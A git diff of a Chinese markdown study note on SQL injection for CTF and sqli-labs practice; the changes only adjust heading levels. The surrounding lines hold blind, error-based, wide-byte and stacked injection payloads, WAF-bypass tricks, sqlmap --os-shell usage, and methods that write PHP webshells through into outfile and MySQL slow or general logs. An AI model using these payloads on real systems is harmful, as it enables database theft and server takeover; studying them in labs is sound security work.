@@ -38,9 +38,9 @@ TocOpen: false
 8. 获取数据（flag）
    * select xxx from xxx_table
 
-# 无回显盲注
+## 无回显盲注
 
-## 布尔盲注（部分回显函数）
+### 布尔盲注（部分回显函数）
 
 - bool盲注利用页面的有限回显信息来进行注入，可以利用每次注入返回一个bool消息来进行先判断信息，如：`where id=1+(substr(select database(), 1, 1)='r', 1, 0)`可对数据库名的单个字符进行判断
 
@@ -77,7 +77,7 @@ TocOpen: false
 
 
 
-## 延时盲注
+### 延时盲注
 
 - 与bool盲注类似，但是页面没有任何可利用的信息，可以通过延时的方式来制作一个bool信息：`where id=1+if(substr(select user(), 1, 1), 1, 0)`
 
@@ -108,9 +108,9 @@ TocOpen: false
   ```
 
 
-# 其他特殊注入
+## 其他特殊注入
 
-## 报错注入
+### 报错注入
 
 当可获得报错信息时可使用报错注入，有三种方式：
 
@@ -140,7 +140,7 @@ TocOpen: false
   extractvalue(null, concat(0x7e, (select user())))
   ```
 
-## 宽字节注入
+### 宽字节注入
 
 当mysql使用GBK编码，但是链接的容器并没有声明编码时，可以用此方法绕过过滤函数
 
@@ -153,7 +153,7 @@ TocOpen: false
   * 但在之后经过gbk编码后将`%df\`看作一个汉字`運`，这样我们的单引号便逃逸了出来
   * 当后续需要使用单引号包裹的数据时，可使用十六进制传入（如将f1ag_table转化为0x663161675f7461626c65）
 
-## 堆叠注入
+### 堆叠注入
 
 也叫多行注入，如果发现代码允许多行查询时可使用
 
@@ -190,7 +190,7 @@ TocOpen: false
 
 
 
-## SQLmap的使用
+### SQLmap的使用
 
 * 相关的payload
 
@@ -205,7 +205,7 @@ TocOpen: false
   ```
 
 
-## 二次注入
+### 二次注入
 
 二次注入是指已 存储 （数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。(可以理解为先将注入的数据存入数据库，后续有代码引用存入数据库的恶意数据，再次注入的一个过程)
 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询
@@ -218,7 +218,7 @@ TocOpen: false
 第二步：引用恶意数据
  开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
 
-## Header注入(请求头注入)
+### Header注入(请求头注入)
 
 header 头注入本质是 insert 注入，从开发者的角度思考，从 header 中获取信息，一般是为了记录登录信息，登录信息包括客户端登录时的 ip_adress、accept 及客户端类型 user-agent 等
 
@@ -234,13 +234,13 @@ header 头注入本质是 insert 注入，从开发者的角度思考，从 head
 
 
 
-# 有WAF情况下的SQL注入
+## 有WAF情况下的SQL注入
 
 * **WAF**，即针对web防火墙，本质上是一些过滤的机制，争对不同的WAF有不同的过滤机制，常见的有**SQL注入过滤**、**XSS过滤**、**文件包含过滤**等等，针对SQL注入过滤的WAF一般会过滤掉一些敏感的关键词，如select、union、information_schema等，或者是一些特殊符号，如单引号、双引号、空格等，甚至是一些常见的payload，如`' or '1'='1`等，所以在有WAF的情况下，我们需要绕过这些过滤机制来进行SQL注入。
 
 并且当SQL题目出现WAF时，一般来说，SQLmap是无法直接解出的，因为SQLmap会被WAF过滤掉，而应对一些WAF需要一些特别的脚本，所以我们需要学会手动进行SQL注入绕过WAF
 
-## SQL注入中的空格绕过
+### SQL注入中的空格绕过
 
 * 注释符替代法
 
@@ -253,11 +253,11 @@ header 头注入本质是 insert 注入，从开发者的角度思考，从 head
 python sqlmap.py -u "http://target/?id=1" --tamper "space2comment.py" --dbs
 ```
 
-# 使用sql语句获取shell
+## 使用sql语句获取shell
 
 在做sqli-lab的时候刷到一个题解写了个新奇的方式就去查了查资料
 
-# Less -7 利用into Outfile来写shell
+### Less -7 利用into Outfile来写shell
 
 源代码：
 
@@ -279,9 +279,9 @@ http:``//www.sqli-lab.cn/Less-7/?id=1')) union select  null,0x3c3f70687020657661
 
 ![img](/images/sql-injection/1937295-20200223214049874-1413040021.png)
 
-## mysql的--os-shell
+### mysql的--os-shell
 
-### 利用原理
+#### 利用原理
 
 --os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件。此为sqlmap的一个命令，利用这条命令的先决条件：
 
@@ -289,9 +289,9 @@ http:``//www.sqli-lab.cn/Less-7/?id=1')) union select  null,0x3c3f70687020657661
 - secure_file_priv没有具体值
 - 知道网站的绝对路径
 
-### 漏洞复现
+#### 漏洞复现
 
-#### --os-shell
+##### --os-shell
 
 ```sql
 python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --os-shell
@@ -332,7 +332,7 @@ command standard output: 'ms-vnwaexpuvbab\administrator'
 
 ![image-20240828105749616](/images/sql-injection/3262985-20240912191553751-618730422.png)
 
-#### --sql-shell
+##### --sql-shell
 
 我们可以先使用这个来执行一些sql语句
 
@@ -368,11 +368,11 @@ select @@secure_file_priv;
 >
 > 在mysql5.6版本后，默认为NULL，并且无法用SQL语句对其进行修改。所以这种只能在配置进行修改
 
-## 二、慢日志getshell
+### 二、慢日志getshell
 
 慢日志：一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值(默认为10秒)，这个查询语句将被记录到慢查询日志中。
 
-### 查看服务器默认时间值
+#### 查看服务器默认时间值
 
 ```sql
 show global variables like '%long_query_time%'
@@ -383,7 +383,7 @@ show global variables like '%long%'
 
 ![image-20240828113006715](/images/sql-injection/3262985-20240912191554584-1652251386.png)
 
-### 查看慢日志参数
+#### 查看慢日志参数
 
 ```sql
 show global variables like '%slow%'
@@ -391,7 +391,7 @@ show global variables like '%slow%'
 
 ![image-20240828113058413](/images/sql-injection/3262985-20240912191554860-1043588222.png)
 
-### 慢日志参数修改getshell
+#### 慢日志参数修改getshell
 
 ```sql
 set global slow_query_log=1         # 打开慢日志
@@ -407,9 +407,9 @@ http://192.168.111.128/test.php
 
 ![image-20240828135751682](/images/sql-injection/3262985-20240912191555953-1587063896.png)
 
-## 三、general_log来getshell
+### 三、general_log来getshell
 
-### 介绍说明
+#### 介绍说明
 
 ```sql
 相关参数一共有3个：general_log、log_output、general_log_file
@@ -429,7 +429,7 @@ set global log_output='file';   -- 设置输出类型为file
 一般log_output都是file,就是将日志存入文件中。table的话就是将日志存入数据库的日志表中。
 ```
 
-### 漏洞复现
+#### 漏洞复现
 
 ```sql
 set global general_log='on';
@@ -444,9 +444,9 @@ http://192.168.111.128/shell.php
 
 ![image-20240828120147355](/images/sql-injection/3262985-20240912191555407-965559790.png)
 
-## 四、into_outfile方法getshell
+### 四、into_outfile方法getshell
 
-### 漏洞复现
+#### 漏洞复现
 
 ```sql
 email=admin'                #（报错）
@@ -475,7 +475,7 @@ email=admin' union select 1,2,3,load_file('/var/www/sqli_shell.php'),5,6,7,8 #
 
 ![image-20240828160043328](/images/sql-injection/3262985-20240912191556947-1128973548.png)
 
-### 缺点
+#### 缺点
 
 ```scss
 1、对web目录需要有写权限能够使用单引号(root)
@@ -489,7 +489,7 @@ email=admin' union select 1,2,3,load_file('/var/www/sqli_shell.php'),5,6,7,8 #
 show global variables like '%secure%';
 ```
 
-## 五、远程加载拿shell
+### 五、远程加载拿shell
 
 ```sql
 # 准备脚本
@@ -514,13 +514,13 @@ http://10.10.10.100/shell8888.py
 
 ![image-20240828153707662](/images/sql-injection/3262985-20240912191556319-341942034.png)
 
-## 六、数据库备份getshell
+### 六、数据库备份getshell
 
 网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等。
 
 而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传的文件格式，如jpg、gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。
 
-## 获取网站根目录方式
+### 获取网站根目录方式
 
 (1)phpinfo()页面：最理想的情况，直接显示web路径
 
